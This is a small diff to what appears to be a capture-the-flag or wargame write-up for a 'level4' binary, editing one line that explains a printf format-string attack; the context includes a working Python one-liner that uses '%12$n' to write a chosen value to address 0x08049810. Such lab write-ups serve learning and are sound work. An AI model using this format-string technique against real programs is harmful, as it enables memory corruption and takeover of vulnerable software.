@@ -48,7 +48,7 @@ we can see it is the 12th arg.
 
 So the we need to write at the address 0x08049810 16930116 - 4 bytes with the 12th arg of printf.
 
-[ addr of m ] [ 16930112 bytes writes to 12th pos ]
+[ addr of m ] + [ 16930112 bytes writes to 12th pos ]
 
 `(python -c 'print("\x10\x98\x04\x08%16930112d%12$n")'; cat) | ./level4`
 
